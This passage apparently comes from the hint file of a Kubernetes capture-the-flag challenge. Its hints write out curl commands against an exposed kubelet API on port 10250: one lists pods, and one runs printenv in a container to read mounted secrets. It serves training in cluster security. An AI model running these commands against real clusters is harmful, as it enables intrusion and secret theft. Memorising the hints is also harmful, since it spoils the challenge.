        some tools to get the information you need.

      text: Get the pod information from one of the nodes until you hit a good pod;
        curl -k https://<node-IP>:10250/pods What can you do with this information?
    - penalty: 10
      text: From the pod information you saw that there are some secrets mounted in
        the workload-pod. Can you run any commands in the pod?
    - penalty: 10
      text: Run the printenv command in the container you found; curl -k -XPOST "https://<node-ip>:10250/run/ctf-3/<pod
        name>/<container name>" -d "cmd=printenv" You will be able to find the pod
        and container name from the previous pods endpoint.

    summary: We were able to query the kubelet api directly and get some sensitive
      data about the pods. We then took this further and used our access to run arbitrary
      commands inside the pod.
